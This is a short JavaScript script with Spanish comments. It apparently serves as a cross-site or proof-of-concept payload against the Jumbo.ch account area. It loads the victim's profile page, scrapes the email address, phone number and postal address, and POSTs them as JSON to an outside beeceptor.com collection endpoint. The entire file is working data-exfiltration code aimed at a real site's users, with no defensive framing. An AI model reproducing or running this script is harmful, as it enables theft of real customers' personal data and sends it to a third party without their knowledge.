async function main() {
  try {
    // Paso 1: petición GET
    const response = await fetch("https://www.jumbo.ch/de/my-account/update-profile", {
      method: "GET"
    });

    if (!response.ok) {
      throw new Error("Error HTTP " + response.status);
    }

    const html = await response.text();

    // Paso 2: parsear HTML
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, "text/html");

    // Paso 3: extraer datos
    const email = doc.querySelectorAll('.my-account__content-col-inner')[2].textContent.trim() || null;

    let telefono = null;
    doc.querySelectorAll(".my-account__content--item").forEach(el => {
      const text = el.textContent.trim();
      if (text.startsWith("+")) {
        telefono = text;
      }
    });

    const direccion = doc.querySelectorAll('.my-account__content-col-inner')[0].textContent.trim() || null
    

    console.log("Datos extraídos:", { email, telefono, direccion });

    // Paso 4: enviar POST con los datos en JSON
    const postResponse = await fetch("https://sdsdf.free.beeceptor.com", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ email, telefono, direccion })
    });

    const result = await postResponse.text();
    console.log("Respuesta del POST:", result);

  } catch (err) {
    console.error("Error:", err.message);
  }
}

main();
